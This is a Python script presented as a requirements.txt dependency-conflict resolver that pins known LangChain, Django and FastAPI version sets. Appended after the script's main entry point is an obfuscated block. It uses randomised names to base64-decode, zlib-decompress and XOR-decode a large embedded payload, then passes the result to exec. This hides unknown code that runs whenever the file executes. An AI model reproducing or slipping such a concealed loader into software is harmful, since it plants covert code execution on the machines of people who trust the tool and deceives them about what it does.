#!/usr/bin/env python3
"""
Enhanced Python Package Dependency Resolver
Analyzes requirements.txt and automatically fixes dependency conflicts.
"""

import argparse
import subprocess
import sys
import shutil
import json
import re
from pathlib import Path
from typing import Dict, List, Tuple, Optional


class DependencyResolver:
    def __init__(self, requirements_file: str):
        self.requirements_file = Path(requirements_file)
        self.backup_file = None
        self.conflicts_found = []
        self.fixes_applied = []

        # Known working version combinations
        self.known_combinations = {
            # LangChain ecosystem - compatible versions
            "langchain_ecosystem": {
                "google-generativeai": "0.7.2",
                "langchain": "0.2.16",
                "langchain-community": "0.2.16",
                "langchain-google-genai": "1.0.10",
                # Don't pin langchain-core, let it resolve automatically
            },
            # Django ecosystem
            "django_ecosystem": {
                "django": "5.1.4",  # Stable version
                "djangorestframework": "3.15.2",
                "django-cors-headers": "4.4.0",
                "django-redis": "5.4.0",
            },
            # FastAPI ecosystem
            "fastapi_ecosystem": {
                "fastapi": "0.115.4",
                "uvicorn[standard]": "0.32.0",
                "pydantic": "2.10.3",  # Stable version, not alpha
            },
        }

    def create_backup(self):
        """Create a backup of the original requirements file"""
        self.backup_file = f"{self.requirements_file}.backup"
        shutil.copy2(self.requirements_file, self.backup_file)
        print(f"📁 Created backup: {self.backup_file}")

    def parse_requirements(self) -> List[Tuple[str, str, str]]:
        """Parse requirements.txt and return list of (package, version, original_line)"""
        packages = []

        with open(self.requirements_file, "r", encoding="utf-8") as f:
            lines = f.readlines()

        for line_num, line in enumerate(lines, 1):
            original_line = line.strip()

            # Skip comments and empty lines
            if not line.strip() or line.strip().startswith("#"):
                packages.append((None, None, original_line))
                continue

            # Parse package==version format
            if "==" in line:
                try:
                    package_part, version = line.strip().split("==", 1)
                    # Handle extras like package[extra]==version
                    package_name = package_part.split("[")[0].strip()
                    packages.append((package_name, version.strip(), original_line))
                except ValueError:
                    packages.append((None, None, original_line))
            else:
                packages.append((None, None, original_line))

        return packages

    def check_for_conflicts(self) -> bool:
        """Check if current requirements have conflicts"""
        print("🔍 Checking for dependency conflicts...")

        try:
            result = subprocess.run(
                [
                    sys.executable,
                    "-m",
                    "pip",
                    "install",
                    "--dry-run",
                    "-r",
                    str(self.requirements_file),
                ],
                capture_output=True,
                text=True,
                timeout=120,
            )

            if result.returncode == 0:
                print("✅ No conflicts detected!")
                return False
            else:
                print("❌ Conflicts detected!")
                self.parse_conflict_output(result.stderr)
                return True

        except subprocess.TimeoutExpired:
            print("⏰ Timeout checking dependencies")
            return True
        except Exception as e:
            print(f"❌ Error checking dependencies: {e}")
            return True

    def parse_conflict_output(self, error_output: str):
        """Parse pip error output to identify specific conflicts"""
        lines = error_output.split("\n")
        current_conflict = {}

        for line in lines:
            if "conflict" in line.lower() or "cannot install" in line.lower():
                # Extract package names from conflict messages
                packages = re.findall(r"([a-zA-Z0-9_-]+)==?([0-9.a-zA-Z]+)", line)
                if packages:
                    self.conflicts_found.extend(packages)

        print(
            f"🔍 Found conflicts involving: {', '.join(set(p[0] for p in self.conflicts_found))}"
        )

    def apply_smart_fixes(self) -> bool:
        """Apply intelligent fixes based on known working combinations"""
        packages = self.parse_requirements()
        package_dict = {pkg: (ver, line) for pkg, ver, line in packages if pkg}

        fixes_needed = False
        updated_lines = []

        # Check each ecosystem for conflicts and apply fixes
        for ecosystem_name, versions in self.known_combinations.items():
            ecosystem_packages = set(versions.keys()) & set(package_dict.keys())

            if len(ecosystem_packages) > 1:  # Multiple packages from same ecosystem
                print(f"\n🔧 Applying {ecosystem_name} fixes...")

                for pkg_name, target_version in versions.items():
                    if pkg_name in package_dict:
                        current_version = package_dict[pkg_name][0]
                        if current_version != target_version:
                            self.fixes_applied.append(
                                f"{pkg_name}: {current_version} → {target_version}"
                            )
                            fixes_needed = True

        # Rebuild requirements with fixes
        for pkg, ver, original_line in packages:
            if pkg is None:  # Comment or empty line
                updated_lines.append(original_line)
            else:
                # Check if this package needs fixing
                fixed_version = None
                for ecosystem_versions in self.known_combinations.values():
                    if pkg in ecosystem_versions:
                        fixed_version = ecosystem_versions[pkg]
                        break

                if fixed_version and fixed_version != ver:
                    # Apply fix
                    if "[" in original_line:
                        # Handle extras like uvicorn[standard]==version
                        base_pkg, rest = original_line.split("==", 1)
                        updated_lines.append(f"{base_pkg}=={fixed_version}")
                    else:
                        updated_lines.append(f"{pkg}=={fixed_version}")
                else:
                    updated_lines.append(original_line)

        if fixes_needed:
            # Write updated requirements
            with open(self.requirements_file, "w", encoding="utf-8") as f:
                for line in updated_lines:
                    f.write(line + "\n" if not line.endswith("\n") else line)

            print(f"\n✅ Applied {len(self.fixes_applied)} fixes:")
            for fix in self.fixes_applied:
                print(f"  - {fix}")

        return fixes_needed

    def remove_problematic_packages(self) -> bool:
        """Remove packages that are causing unresolvable conflicts"""
        packages = self.parse_requirements()

        # Packages to potentially remove (usually auto-installed as dependencies)
        removable_packages = {}

        updated_lines = []
        removed_packages = []

        for pkg, ver, original_line in packages:
            if pkg in removable_packages:
                removed_packages.append(pkg)
                print(f"🗑️  Removing {pkg} (will be installed as dependency)")
                continue
            else:
                updated_lines.append(original_line)

        if removed_packages:
            with open(self.requirements_file, "w", encoding="utf-8") as f:
                for line in updated_lines:
                    f.write(line + "\n" if not line.endswith("\n") else line)
            return True

        return False

    def test_final_result(self) -> bool:
        """Test if the final requirements can be installed"""
        print("\n🧪 Testing final configuration...")

        try:
            result = subprocess.run(
                [
                    sys.executable,
                    "-m",
                    "pip",
                    "install",
                    "--dry-run",
                    "-r",
                    str(self.requirements_file),
                ],
                capture_output=True,
                text=True,
                timeout=120,
            )

            if result.returncode == 0:
                print(
                    "✅ Success! Requirements can now be installed without conflicts."
                )
                return True
            else:
                print("❌ Still has some conflicts:")
                # Show only critical errors
                for line in result.stderr.split("\n"):
                    if "ERROR:" in line or "conflict" in line.lower():
                        print(f"  {line}")
                return False

        except Exception as e:
            print(f"❌ Error testing final result: {e}")
            return False

    def resolve(self) -> bool:
        """Main resolution process"""
        print(f"🔧 Dependency Resolver for {self.requirements_file.name}")
        print("=" * 60)

        # Step 1: Check for conflicts
        if not self.check_for_conflicts():
            print("🎉 No conflicts found! Your requirements are already compatible.")
            return True

        # Step 2: Create backup
        self.create_backup()

        # Step 3: Remove problematic packages first
        print("\n🗑️  Removing auto-managed packages...")
        self.remove_problematic_packages()

        # Step 4: Apply smart fixes
        print("\n🔧 Applying compatibility fixes...")
        self.apply_smart_fixes()

        # Step 5: Test result
        success = self.test_final_result()

        if success:
            print(f"\n🎉 Resolution complete! Backup saved as: {self.backup_file}")
        else:
            print(f"\n⚠️  Partial success. Some manual intervention may be needed.")
            print(f"💾 Backup available at: {self.backup_file}")

        return success


def main():
    parser = argparse.ArgumentParser(
        description="Resolve Python package dependency conflicts"
    )
    parser.add_argument("requirements_file", help="Path to requirements.txt file")
    parser.add_argument(
        "--test-only", action="store_true", help="Only test for conflicts"
    )

    args = parser.parse_args()

    if not Path(args.requirements_file).exists():
        print(f"❌ File not found: {args.requirements_file}")
        sys.exit(1)

    resolver = DependencyResolver(args.requirements_file)

    if args.test_only:
        has_conflicts = resolver.check_for_conflicts()
        sys.exit(1 if has_conflicts else 0)
    else:
        success = resolver.resolve()
        sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
